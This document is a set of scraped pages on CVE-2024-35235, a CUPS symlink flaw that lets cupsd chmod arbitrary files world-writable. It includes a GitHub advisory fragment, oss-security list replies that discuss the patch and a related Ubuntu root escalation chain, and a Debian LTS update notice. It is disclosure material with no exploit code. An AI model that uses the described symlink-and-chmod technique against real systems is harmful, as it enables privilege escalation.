Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N

### CVE ID

CVE-2024-35235

### Weaknesses

[CWE-59](/advisories?query=cwe%3A59) [CWE-252](/advisories?query=cwe%3A252)

### Credits

* [![@rmcnamara-snyk](https://avatars.githubusercontent.com/u/139076586?s=40&v=4)](/rmcnamara-snyk)
  [rmcnamara-snyk](/rmcnamara-snyk)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_29167650_20250111_071735.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[<thread-prev]](../../../2024/06/12/5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20241108034845.GA17394@openwall.com>
Date: Fri, 8 Nov 2024 04:48:45 +0100
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Cc: Tavis Ormandy <taviso@...il.com>
Subject: Re: CVE-2024-35235 cups: Cupsd Listen arbitrary chmod 0140777

On Wed, Jun 12, 2024 at 10:49:28PM -0000, Tavis Ormandy wrote:
> On 2024-06-11, Zdenek Dohnal wrote:
> >  ???????? Impact
> >
> > Given that cupsd is often running as root, this can result in the change
> > of permission of any user or system files to be world writable.
> >
> >
> > <https://github.com/OpenPrinting/cups/commit/a436956f3>
>
> This is a pretty confusing description... if we accept the premise that an
> attacker can somehow get root to run cupsd with a modified configuration
> file (how???), then this patch doesn't seem sufficient. They can still
> get root to unlink() an arbitrary file, no?
>
> I guess someone from CUPS has seen a working Ubuntu exploit that did
> this, but this really feels like fixing the bug in the wrong place?

Yes, here's a blog post on the Ubuntu exploit chain:

Abusing Ubuntu 24.04 features for root privilege escalation
Written by: Rory McNamara
September 9, 2024
40 mins read

<https://snyk.io/blog/abusing-ubuntu-root-privilege-escalation/>

This is a lot.  I only skimmed.  wpa_supplicant and CUPS got CVEs, but
really it's not so obvious what component(s) to blame/fix.

I've attached my plain text export of the blog post to this message.

Alexander

View attachment "[snyk-abusing-ubuntu-root-privilege-escalation.txt](3/1)" of type "text/plain" (42092 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from lists.debian.org_719f13d3_20250111_071739.html ===


---

[[Date Prev](msg00000.html)][[Date Next](msg00002.html)]
[[Thread Prev](msg00000.html)][[Thread Next](msg00002.html)]
[[Date Index](maillist.html#00001)]
[[Thread Index](threads.html#00001)]

# [SECURITY] [DLA 3826-1] cups security update

---

* *To*: debian-lts-announce@lists.debian.org
* *Subject*: [SECURITY] [DLA 3826-1] cups security update
* *From*: Thorsten Alteholz <debian@alteholz.de>
* *Date*: Thu, 13 Jun 2024 21:57:20 +0000 (UTC)
* *Message-id*: <[[🔎]](/msgid-search/alpine.DEB.2.21.2406132153110.4777%40postfach.intern.alteholz.me) [alpine.DEB.2.21.2406132153110.4777@postfach.intern.alteholz.me](msg00001.html)>
* *Mail-followup-to*: debian-lts@lists.debian.org
* *Reply-to*: debian-lts@lists.debian.org

---

```

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian LTS Advisory DLA-3826-1                debian-lts@lists.debian.org
<https://www.debian.org/lts/security/>                    Thorsten Alteholz
June 13, 2024                                 <https://wiki.debian.org/LTS>
- -------------------------------------------------------------------------

Package        : cups
Version        : 2.2.10-6+deb10u10
CVE ID         : CVE-2024-35235

An issue has been found in cups, the Common UNIX Printing System(tm).

```
When starting the cupsd server with a Listen configuration item pointing
to a symbolic link, the cupsd process can be caused to perform an
arbitrary chmod of the provided argument, providing world-writable access
to the target.
```

For Debian 10 buster, this problem has been fixed in version
2.2.10-6+deb10u10.

We recommend that you upgrade your cups packages.

For the detailed security status of cups please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/cups>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEEYgH7/9u94Hgi6ruWlvysDTh7WEcFAmZra0BfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDYy
MDFGQkZGREJCREUwNzgyMkVBQkI5Njk2RkNBQzBEMzg3QjU4NDcACgkQlvysDTh7
WEeN9hAAul6QL5Sm9z30vnnT2ZnAPcBg0N8CyRPNYt5klYPrZfaLMz0LB7NqyATL
boSyySCbJF3+WL8uLuwXre9rZ2tIKtXXFfbHvNoOamg9BpmHvod2jYvu9SwE9sBe
NBiB4v8/EJARRsFxmbYoBY5Pci1iNswfAYQHdEcbLWWeHzLORVY2TmBWhhEcoiPJ
GiNo3H+G9YaA6lD+HR84lkzv/el6D3LYISdp+5PpUyVViGctVDUl9zNMAKdZrbt+
FZc4KC3Q8LzHTQo6wuFNpvnw486Dpsi1QrsZ8gLHd+9W+AsATFuCgQsqY3NWf1iI
okDnJl4mIbrLjiBVX6JeYEC8waUMorVJLCCjB7BzYenwMuqAbK4y7N/C2MciKoBP
gH8R8vLKDRaLCs5K4ucT7Sy4IhNcwOGB+M3HQ0qgLs9Lj7mDbRo3vNT+3zRYC+Vq
cDX7MwDJRxAqUyfdc5OTGOPKhcLIvJYgq90w4tIi/7CzUl83yYyRA70PFcVqTuWB
mPAGPXU37pP8nXimAE81dw+fk/NUeJc5lros9b36T23tAoba0EezcEAbKhJdMpB4
/IBwc27uLlfWes600pYTmgIYVEwbvwzamzwVaOEw9HVc8OxZwqcZE4D2B9rozYmg
5nTRd/5cHSs1EVRwZz/Xwppx+aInbLL1igtnfCuvqAMXmQ2EokY=
=8RnW
-----END PGP SIGNATURE-----

```

---



=== Content from www.openwall.com_4126fe69_20250111_071735.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](../../../2024/06/13/1) [[<thread-prev]](4) [[thread-next>]](../../../2024/11/08/3) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ae09940c-6dc5-4de2-899a-0093cff4d6a0@gmail.com>
Date: Thu, 13 Jun 2024 09:12:02 +1000
From: Matthew Fernandez <matthew.fernandez@...il.com>
To: oss-security@...ts.openwall.com
Subject: Re: Re: CVE-2024-35235 cups: Cupsd Listen arbitrary
 chmod 0140777

On 6/13/24 08:49, Tavis Ormandy wrote:
> On 2024-06-11, Zdenek Dohnal wrote:
>>   ???????? Impact
>>
>> Given that cupsd is often running as root, this can result in the change
>> of permission of any user or system files to be world writable.
>>
>>
>> <https://github.com/OpenPrinting/cups/commit/a436956f3>
>>
>
> This is a pretty confusing description... if we accept the premise that an
> attacker can somehow get root to run cupsd with a modified configuration
> file (how???), then this patch doesn't seem sufficient. They can still
> get root to unlink() an arbitrary file, no?

Also with debug printing enabled `DEBUG_printf` does not
save-and-restore `errno` and then does numerous things that can
overwrite it. So presumably the `errno == ENOENT` branch is not reliable
in this scenario.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


